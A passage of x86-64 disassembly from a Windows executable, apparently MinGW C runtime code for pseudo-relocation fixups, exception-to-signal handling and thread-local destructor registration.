   140002c2c:	e8 9f fa ff ff       	call   0x1400026d0
   140002c31:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140002c35:	48 83 c0 0c          	add    $0xc,%rax
   140002c39:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002c3d:	e9 65 02 00 00       	jmp    0x140002ea7
   140002c42:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002c46:	8b 40 04             	mov    0x4(%rax),%eax
   140002c49:	89 c2                	mov    %eax,%edx
   140002c4b:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140002c4f:	48 01 d0             	add    %rdx,%rax
   140002c52:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140002c56:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002c5a:	8b 00                	mov    (%rax),%eax
   140002c5c:	89 c2                	mov    %eax,%edx
   140002c5e:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140002c62:	48 01 d0             	add    %rdx,%rax
   140002c65:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140002c69:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140002c6d:	48 8b 00             	mov    (%rax),%rax
   140002c70:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140002c74:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002c78:	8b 40 08             	mov    0x8(%rax),%eax
   140002c7b:	0f b6 c0             	movzbl %al,%eax
   140002c7e:	83 f8 40             	cmp    $0x40,%eax
   140002c81:	0f 84 b6 00 00 00    	je     0x140002d3d
   140002c87:	83 f8 40             	cmp    $0x40,%eax
   140002c8a:	0f 87 ba 00 00 00    	ja     0x140002d4a
   140002c90:	83 f8 20             	cmp    $0x20,%eax
   140002c93:	74 77                	je     0x140002d0c
   140002c95:	83 f8 20             	cmp    $0x20,%eax
   140002c98:	0f 87 ac 00 00 00    	ja     0x140002d4a
   140002c9e:	83 f8 08             	cmp    $0x8,%eax
   140002ca1:	74 0a                	je     0x140002cad
   140002ca3:	83 f8 10             	cmp    $0x10,%eax
   140002ca6:	74 38                	je     0x140002ce0
   140002ca8:	e9 9d 00 00 00       	jmp    0x140002d4a
   140002cad:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002cb1:	0f b6 00             	movzbl (%rax),%eax
   140002cb4:	0f b6 c0             	movzbl %al,%eax
   140002cb7:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002cbb:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140002cbf:	25 80 00 00 00       	and    $0x80,%eax
   140002cc4:	48 85 c0             	test   %rax,%rax
   140002cc7:	0f 84 9d 00 00 00    	je     0x140002d6a
   140002ccd:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140002cd1:	48 0d 00 ff ff ff    	or     $0xffffffffffffff00,%rax
   140002cd7:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002cdb:	e9 8a 00 00 00       	jmp    0x140002d6a
   140002ce0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002ce4:	0f b7 00             	movzwl (%rax),%eax
   140002ce7:	0f b7 c0             	movzwl %ax,%eax
   140002cea:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002cee:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140002cf2:	25 00 80 00 00       	and    $0x8000,%eax
   140002cf7:	48 85 c0             	test   %rax,%rax
   140002cfa:	74 71                	je     0x140002d6d
   140002cfc:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140002d00:	48 0d 00 00 ff ff    	or     $0xffffffffffff0000,%rax
   140002d06:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002d0a:	eb 61                	jmp    0x140002d6d
   140002d0c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002d10:	8b 00                	mov    (%rax),%eax
   140002d12:	89 c0                	mov    %eax,%eax
   140002d14:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002d18:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140002d1c:	25 00 00 00 80       	and    $0x80000000,%eax
   140002d21:	48 85 c0             	test   %rax,%rax
   140002d24:	74 4a                	je     0x140002d70
   140002d26:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140002d2a:	48 ba 00 00 00 00 ff 	movabs $0xffffffff00000000,%rdx
   140002d31:	ff ff ff 
   140002d34:	48 09 d0             	or     %rdx,%rax
   140002d37:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002d3b:	eb 33                	jmp    0x140002d70
   140002d3d:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002d41:	48 8b 00             	mov    (%rax),%rax
   140002d44:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002d48:	eb 27                	jmp    0x140002d71
   140002d4a:	48 c7 45 b8 00 00 00 	movq   $0x0,-0x48(%rbp)
   140002d51:	00 
   140002d52:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002d56:	8b 40 08             	mov    0x8(%rax),%eax
   140002d59:	0f b6 c0             	movzbl %al,%eax
   140002d5c:	48 8d 0d e5 96 00 00 	lea    0x96e5(%rip),%rcx        # 0x14000c448
   140002d63:	89 c2                	mov    %eax,%edx
   140002d65:	e8 66 f9 ff ff       	call   0x1400026d0
   140002d6a:	90                   	nop
   140002d6b:	eb 04                	jmp    0x140002d71
   140002d6d:	90                   	nop
   140002d6e:	eb 01                	jmp    0x140002d71
   140002d70:	90                   	nop
   140002d71:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
   140002d75:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002d79:	8b 00                	mov    (%rax),%eax
   140002d7b:	89 c2                	mov    %eax,%edx
   140002d7d:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140002d81:	48 01 c2             	add    %rax,%rdx
   140002d84:	48 89 c8             	mov    %rcx,%rax
   140002d87:	48 29 d0             	sub    %rdx,%rax
   140002d8a:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002d8e:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
   140002d92:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140002d96:	48 01 d0             	add    %rdx,%rax
   140002d99:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140002d9d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002da1:	8b 40 08             	mov    0x8(%rax),%eax
   140002da4:	25 ff 00 00 00       	and    $0xff,%eax
   140002da9:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140002dac:	83 7d d4 3f          	cmpl   $0x3f,-0x2c(%rbp)
   140002db0:	77 67                	ja     0x140002e19
   140002db2:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   140002db5:	ba 01 00 00 00       	mov    $0x1,%edx
   140002dba:	89 c1                	mov    %eax,%ecx
   140002dbc:	48 d3 e2             	shl    %cl,%rdx
   140002dbf:	48 89 d0             	mov    %rdx,%rax
   140002dc2:	48 83 e8 01          	sub    $0x1,%rax
   140002dc6:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140002dca:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   140002dcd:	83 e8 01             	sub    $0x1,%eax
   140002dd0:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   140002dd7:	89 c1                	mov    %eax,%ecx
   140002dd9:	48 d3 e2             	shl    %cl,%rdx
   140002ddc:	48 89 d0             	mov    %rdx,%rax
   140002ddf:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140002de3:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140002de7:	48 39 45 c8          	cmp    %rax,-0x38(%rbp)
   140002deb:	7c 0a                	jl     0x140002df7
   140002ded:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140002df1:	48 39 45 c0          	cmp    %rax,-0x40(%rbp)
   140002df5:	7e 22                	jle    0x140002e19
   140002df7:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
   140002dfb:	4c 8b 4d d8          	mov    -0x28(%rbp),%r9
   140002dff:	4c 8b 45 e0          	mov    -0x20(%rbp),%r8
   140002e03:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   140002e06:	48 8d 0d 6b 96 00 00 	lea    0x966b(%rip),%rcx        # 0x14000c478
   140002e0d:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002e12:	89 c2                	mov    %eax,%edx
   140002e14:	e8 b7 f8 ff ff       	call   0x1400026d0
   140002e19:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002e1d:	8b 40 08             	mov    0x8(%rax),%eax
   140002e20:	0f b6 c0             	movzbl %al,%eax
   140002e23:	83 f8 40             	cmp    $0x40,%eax
   140002e26:	74 63                	je     0x140002e8b
   140002e28:	83 f8 40             	cmp    $0x40,%eax
   140002e2b:	77 75                	ja     0x140002ea2
   140002e2d:	83 f8 20             	cmp    $0x20,%eax
   140002e30:	74 41                	je     0x140002e73
   140002e32:	83 f8 20             	cmp    $0x20,%eax
   140002e35:	77 6b                	ja     0x140002ea2
   140002e37:	83 f8 08             	cmp    $0x8,%eax
   140002e3a:	74 07                	je     0x140002e43
   140002e3c:	83 f8 10             	cmp    $0x10,%eax
   140002e3f:	74 1a                	je     0x140002e5b
   140002e41:	eb 5f                	jmp    0x140002ea2
   140002e43:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002e47:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   140002e4b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002e51:	48 89 c1             	mov    %rax,%rcx
   140002e54:	e8 a0 fc ff ff       	call   0x140002af9
   140002e59:	eb 47                	jmp    0x140002ea2
   140002e5b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002e5f:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   140002e63:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140002e69:	48 89 c1             	mov    %rax,%rcx
   140002e6c:	e8 88 fc ff ff       	call   0x140002af9
   140002e71:	eb 2f                	jmp    0x140002ea2
   140002e73:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002e77:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   140002e7b:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140002e81:	48 89 c1             	mov    %rax,%rcx
   140002e84:	e8 70 fc ff ff       	call   0x140002af9
   140002e89:	eb 17                	jmp    0x140002ea2
   140002e8b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002e8f:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   140002e93:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140002e99:	48 89 c1             	mov    %rax,%rcx
   140002e9c:	e8 58 fc ff ff       	call   0x140002af9
   140002ea1:	90                   	nop
   140002ea2:	48 83 45 f0 0c       	addq   $0xc,-0x10(%rbp)
   140002ea7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002eab:	48 3b 45 18          	cmp    0x18(%rbp),%rax
   140002eaf:	0f 82 8d fd ff ff    	jb     0x140002c42
   140002eb5:	eb 01                	jmp    0x140002eb8
   140002eb7:	90                   	nop
   140002eb8:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   140002ebc:	5d                   	pop    %rbp
   140002ebd:	c3                   	ret
   140002ebe:	55                   	push   %rbp
   140002ebf:	48 89 e5             	mov    %rsp,%rbp
   140002ec2:	48 83 ec 30          	sub    $0x30,%rsp
   140002ec6:	8b 05 40 e2 00 00    	mov    0xe240(%rip),%eax        # 0x14001110c
   140002ecc:	85 c0                	test   %eax,%eax
   140002ece:	0f 85 88 00 00 00    	jne    0x140002f5c
   140002ed4:	8b 05 32 e2 00 00    	mov    0xe232(%rip),%eax        # 0x14001110c
   140002eda:	83 c0 01             	add    $0x1,%eax
   140002edd:	89 05 29 e2 00 00    	mov    %eax,0xe229(%rip)        # 0x14001110c
   140002ee3:	e8 d3 08 00 00       	call   0x1400037bb
   140002ee8:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140002eeb:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002eee:	48 63 d0             	movslq %eax,%rdx
   140002ef1:	48 89 d0             	mov    %rdx,%rax
   140002ef4:	48 c1 e0 02          	shl    $0x2,%rax
   140002ef8:	48 01 d0             	add    %rdx,%rax
   140002efb:	48 c1 e0 03          	shl    $0x3,%rax
   140002eff:	48 83 c0 0f          	add    $0xf,%rax
   140002f03:	48 c1 e8 04          	shr    $0x4,%rax
   140002f07:	48 c1 e0 04          	shl    $0x4,%rax
   140002f0b:	e8 30 0b 00 00       	call   0x140003a40
   140002f10:	48 29 c4             	sub    %rax,%rsp
   140002f13:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140002f18:	48 83 c0 0f          	add    $0xf,%rax
   140002f1c:	48 c1 e8 04          	shr    $0x4,%rax
   140002f20:	48 c1 e0 04          	shl    $0x4,%rax
   140002f24:	48 89 05 d5 e1 00 00 	mov    %rax,0xe1d5(%rip)        # 0x140011100
   140002f2b:	c7 05 d3 e1 00 00 00 	movl   $0x0,0xe1d3(%rip)        # 0x140011108
   140002f32:	00 00 00 
   140002f35:	48 8b 0d b4 97 00 00 	mov    0x97b4(%rip),%rcx        # 0x14000c6f0
   140002f3c:	48 8b 15 bd 97 00 00 	mov    0x97bd(%rip),%rdx        # 0x14000c700
   140002f43:	48 8b 05 c6 97 00 00 	mov    0x97c6(%rip),%rax        # 0x14000c710
   140002f4a:	49 89 c8             	mov    %rcx,%r8
   140002f4d:	48 89 c1             	mov    %rax,%rcx
   140002f50:	e8 eb fb ff ff       	call   0x140002b40
   140002f55:	e8 c7 fa ff ff       	call   0x140002a21
   140002f5a:	eb 01                	jmp    0x140002f5d
   140002f5c:	90                   	nop
   140002f5d:	48 89 ec             	mov    %rbp,%rsp
   140002f60:	5d                   	pop    %rbp
   140002f61:	c3                   	ret
   140002f62:	90                   	nop
   140002f63:	90                   	nop
   140002f64:	90                   	nop
   140002f65:	90                   	nop
   140002f66:	90                   	nop
   140002f67:	90                   	nop
   140002f68:	90                   	nop
   140002f69:	90                   	nop
   140002f6a:	90                   	nop
   140002f6b:	90                   	nop
   140002f6c:	90                   	nop
   140002f6d:	90                   	nop
   140002f6e:	90                   	nop
   140002f6f:	90                   	nop
   140002f70:	55                   	push   %rbp
   140002f71:	48 89 e5             	mov    %rsp,%rbp
   140002f74:	48 83 ec 50          	sub    $0x50,%rsp
   140002f78:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140002f7b:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140002f7f:	f2 0f 11 55 20       	movsd  %xmm2,0x20(%rbp)
   140002f84:	f2 0f 11 5d 28       	movsd  %xmm3,0x28(%rbp)
   140002f89:	48 8b 05 80 e1 00 00 	mov    0xe180(%rip),%rax        # 0x140011110
   140002f90:	48 85 c0             	test   %rax,%rax
   140002f93:	74 3e                	je     0x140002fd3
   140002f95:	8b 45 10             	mov    0x10(%rbp),%eax
   140002f98:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140002f9b:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140002f9f:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140002fa3:	f2 0f 10 45 20       	movsd  0x20(%rbp),%xmm0
   140002fa8:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   140002fad:	f2 0f 10 45 28       	movsd  0x28(%rbp),%xmm0
   140002fb2:	f2 0f 11 45 e8       	movsd  %xmm0,-0x18(%rbp)
   140002fb7:	f2 0f 10 45 30       	movsd  0x30(%rbp),%xmm0
   140002fbc:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   140002fc1:	48 8b 15 48 e1 00 00 	mov    0xe148(%rip),%rdx        # 0x140011110
   140002fc8:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140002fcc:	48 89 c1             	mov    %rax,%rcx
   140002fcf:	ff d2                	call   *%rdx
   140002fd1:	eb 01                	jmp    0x140002fd4
   140002fd3:	90                   	nop
   140002fd4:	48 83 c4 50          	add    $0x50,%rsp
   140002fd8:	5d                   	pop    %rbp
   140002fd9:	c3                   	ret
   140002fda:	55                   	push   %rbp
   140002fdb:	48 89 e5             	mov    %rsp,%rbp
   140002fde:	48 83 ec 20          	sub    $0x20,%rsp
   140002fe2:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140002fe6:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140002fea:	48 89 05 1f e1 00 00 	mov    %rax,0xe11f(%rip)        # 0x140011110
   140002ff1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140002ff5:	48 89 c1             	mov    %rax,%rcx
   140002ff8:	e8 53 70 00 00       	call   0x14000a050
   140002ffd:	90                   	nop
   140002ffe:	48 83 c4 20          	add    $0x20,%rsp
   140003002:	5d                   	pop    %rbp
   140003003:	c3                   	ret
   140003004:	90                   	nop
   140003005:	90                   	nop
   140003006:	90                   	nop
   140003007:	90                   	nop
   140003008:	90                   	nop
   140003009:	90                   	nop
   14000300a:	90                   	nop
   14000300b:	90                   	nop
   14000300c:	90                   	nop
   14000300d:	90                   	nop
   14000300e:	90                   	nop
   14000300f:	90                   	nop
   140003010:	55                   	push   %rbp
   140003011:	48 89 e5             	mov    %rsp,%rbp
   140003014:	48 83 ec 30          	sub    $0x30,%rsp
   140003018:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000301c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140003023:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
   14000302a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000302e:	48 8b 00             	mov    (%rax),%rax
   140003031:	8b 00                	mov    (%rax),%eax
   140003033:	25 ff ff ff 20       	and    $0x20ffffff,%eax
   140003038:	3d 43 43 47 20       	cmp    $0x20474343,%eax
   14000303d:	75 1b                	jne    0x14000305a
   14000303f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003043:	48 8b 00             	mov    (%rax),%rax
   140003046:	8b 40 04             	mov    0x4(%rax),%eax
   140003049:	83 e0 01             	and    $0x1,%eax
   14000304c:	85 c0                	test   %eax,%eax
   14000304e:	75 0a                	jne    0x14000305a
   140003050:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003055:	e9 2a 02 00 00       	jmp    0x140003284
   14000305a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000305e:	48 8b 00             	mov    (%rax),%rax
   140003061:	8b 00                	mov    (%rax),%eax
   140003063:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
   140003068:	0f 84 28 01 00 00    	je     0x140003196
   14000306e:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
   140003073:	0f 87 d9 01 00 00    	ja     0x140003252
   140003079:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
   14000307e:	0f 84 c5 01 00 00    	je     0x140003249
   140003084:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
   140003089:	0f 87 c3 01 00 00    	ja     0x140003252
   14000308f:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
   140003094:	0f 84 57 01 00 00    	je     0x1400031f1
   14000309a:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
   14000309f:	0f 87 ad 01 00 00    	ja     0x140003252
   1400030a5:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
   1400030aa:	0f 84 3a 01 00 00    	je     0x1400031ea
   1400030b0:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
   1400030b5:	0f 87 97 01 00 00    	ja     0x140003252
   1400030bb:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
   1400030c0:	0f 84 83 01 00 00    	je     0x140003249
   1400030c6:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
   1400030cb:	0f 87 81 01 00 00    	ja     0x140003252
   1400030d1:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
   1400030d6:	0f 87 76 01 00 00    	ja     0x140003252
   1400030dc:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
   1400030e1:	0f 83 03 01 00 00    	jae    0x1400031ea
   1400030e7:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
   1400030ec:	0f 84 57 01 00 00    	je     0x140003249
   1400030f2:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
   1400030f7:	0f 87 55 01 00 00    	ja     0x140003252
   1400030fd:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   140003102:	0f 84 8e 00 00 00    	je     0x140003196
   140003108:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   14000310d:	0f 87 3f 01 00 00    	ja     0x140003252
   140003113:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140003118:	0f 84 2b 01 00 00    	je     0x140003249
   14000311e:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   140003123:	0f 87 29 01 00 00    	ja     0x140003252
   140003129:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   14000312e:	0f 84 15 01 00 00    	je     0x140003249
   140003134:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140003139:	0f 85 13 01 00 00    	jne    0x140003252
   14000313f:	ba 00 00 00 00       	mov    $0x0,%edx
   140003144:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140003149:	e8 c2 6f 00 00       	call   0x14000a110
   14000314e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003152:	48 83 7d f0 01       	cmpq   $0x1,-0x10(%rbp)
   140003157:	75 1b                	jne    0x140003174
   140003159:	ba 01 00 00 00       	mov    $0x1,%edx
   14000315e:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140003163:	e8 a8 6f 00 00       	call   0x14000a110
   140003168:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
   14000316f:	e9 e1 00 00 00       	jmp    0x140003255
   140003174:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140003179:	0f 84 d6 00 00 00    	je     0x140003255
   14000317f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003183:	b9 0b 00 00 00       	mov    $0xb,%ecx
   140003188:	ff d0                	call   *%rax
   14000318a:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
   140003191:	e9 bf 00 00 00       	jmp    0x140003255
   140003196:	ba 00 00 00 00       	mov    $0x0,%edx
   14000319b:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400031a0:	e8 6b 6f 00 00       	call   0x14000a110
   1400031a5:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400031a9:	48 83 7d f0 01       	cmpq   $0x1,-0x10(%rbp)
   1400031ae:	75 1b                	jne    0x1400031cb
   1400031b0:	ba 01 00 00 00       	mov    $0x1,%edx
   1400031b5:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400031ba:	e8 51 6f 00 00       	call   0x14000a110
   1400031bf:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
   1400031c6:	e9 8d 00 00 00       	jmp    0x140003258
   1400031cb:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   1400031d0:	0f 84 82 00 00 00    	je     0x140003258
   1400031d6:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400031da:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400031df:	ff d0                	call   *%rax
   1400031e1:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
   1400031e8:	eb 6e                	jmp    0x140003258
   1400031ea:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%rbp)
   1400031f1:	ba 00 00 00 00       	mov    $0x0,%edx
   1400031f6:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400031fb:	e8 10 6f 00 00       	call   0x14000a110
   140003200:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140003204:	48 83 7d f0 01       	cmpq   $0x1,-0x10(%rbp)
   140003209:	75 23                	jne    0x14000322e
   14000320b:	ba 01 00 00 00       	mov    $0x1,%edx
   140003210:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003215:	e8 f6 6e 00 00       	call   0x14000a110
   14000321a:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
   14000321e:	74 05                	je     0x140003225
   140003220:	e8 9b f4 ff ff       	call   0x1400026c0
   140003225:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
   14000322c:	eb 2d                	jmp    0x14000325b
   14000322e:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140003233:	74 26                	je     0x14000325b
   140003235:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003239:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000323e:	ff d0                	call   *%rax
   140003240:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
   140003247:	eb 12                	jmp    0x14000325b
   140003249:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
   140003250:	eb 0a                	jmp    0x14000325c
   140003252:	90                   	nop
   140003253:	eb 07                	jmp    0x14000325c
   140003255:	90                   	nop
   140003256:	eb 04                	jmp    0x14000325c
   140003258:	90                   	nop
   140003259:	eb 01                	jmp    0x14000325c
   14000325b:	90                   	nop
   14000325c:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   140003260:	75 1f                	jne    0x140003281
   140003262:	48 8b 05 c7 de 00 00 	mov    0xdec7(%rip),%rax        # 0x140011130
   140003269:	48 85 c0             	test   %rax,%rax
   14000326c:	74 13                	je     0x140003281
   14000326e:	48 8b 15 bb de 00 00 	mov    0xdebb(%rip),%rdx        # 0x140011130
   140003275:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140003279:	48 89 c1             	mov    %rax,%rcx
   14000327c:	ff d2                	call   *%rdx
   14000327e:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140003281:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140003284:	48 83 c4 30          	add    $0x30,%rsp
   140003288:	5d                   	pop    %rbp
   140003289:	c3                   	ret
   14000328a:	90                   	nop
   14000328b:	90                   	nop
   14000328c:	90                   	nop
   14000328d:	90                   	nop
   14000328e:	90                   	nop
   14000328f:	90                   	nop
   140003290:	55                   	push   %rbp
   140003291:	48 89 e5             	mov    %rsp,%rbp
   140003294:	48 83 ec 30          	sub    $0x30,%rsp
   140003298:	89 4d 10             	mov    %ecx,0x10(%rbp)
   14000329b:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   14000329f:	8b 05 c3 de 00 00    	mov    0xdec3(%rip),%eax        # 0x140011168
   1400032a5:	85 c0                	test   %eax,%eax
   1400032a7:	75 07                	jne    0x1400032b0
   1400032a9:	b8 00 00 00 00       	mov    $0x0,%eax
   1400032ae:	eb 7b                	jmp    0x14000332b
   1400032b0:	ba 18 00 00 00       	mov    $0x18,%edx
   1400032b5:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400032ba:	e8 d9 6d 00 00       	call   0x14000a098
   1400032bf:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400032c3:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   1400032c8:	75 07                	jne    0x1400032d1
   1400032ca:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400032cf:	eb 5a                	jmp    0x14000332b
   1400032d1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400032d5:	8b 55 10             	mov    0x10(%rbp),%edx
   1400032d8:	89 10                	mov    %edx,(%rax)
   1400032da:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400032de:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   1400032e2:	48 89 50 08          	mov    %rdx,0x8(%rax)
   1400032e6:	48 8d 05 53 de 00 00 	lea    0xde53(%rip),%rax        # 0x140011140
   1400032ed:	48 89 c1             	mov    %rax,%rcx
   1400032f0:	48 8b 05 69 ef 00 00 	mov    0xef69(%rip),%rax        # 0x140012260
   1400032f7:	ff d0                	call   *%rax
   1400032f9:	48 8b 15 70 de 00 00 	mov    0xde70(%rip),%rdx        # 0x140011170
   140003300:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140003304:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140003308:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000330c:	48 89 05 5d de 00 00 	mov    %rax,0xde5d(%rip)        # 0x140011170
   140003313:	48 8d 05 26 de 00 00 	lea    0xde26(%rip),%rax        # 0x140011140
   14000331a:	48 89 c1             	mov    %rax,%rcx
   14000331d:	48 8b 05 8c ef 00 00 	mov    0xef8c(%rip),%rax        # 0x1400122b0
   140003324:	ff d0                	call   *%rax
   140003326:	b8 00 00 00 00       	mov    $0x0,%eax
   14000332b:	48 83 c4 30          	add    $0x30,%rsp
   14000332f:	5d                   	pop    %rbp
   140003330:	c3                   	ret
   140003331:	55                   	push   %rbp
   140003332:	48 89 e5             	mov    %rsp,%rbp
   140003335:	48 83 ec 30          	sub    $0x30,%rsp
   140003339:	89 4d 10             	mov    %ecx,0x10(%rbp)
   14000333c:	8b 05 26 de 00 00    	mov    0xde26(%rip),%eax        # 0x140011168
   140003342:	85 c0                	test   %eax,%eax
   140003344:	75 0a                	jne    0x140003350
   140003346:	b8 00 00 00 00       	mov    $0x0,%eax
   14000334b:	e9 9c 00 00 00       	jmp    0x1400033ec
   140003350:	48 8d 05 e9 dd 00 00 	lea    0xdde9(%rip),%rax        # 0x140011140
   140003357:	48 89 c1             	mov    %rax,%rcx
   14000335a:	48 8b 05 ff ee 00 00 	mov    0xeeff(%rip),%rax        # 0x140012260
   140003361:	ff d0                	call   *%rax
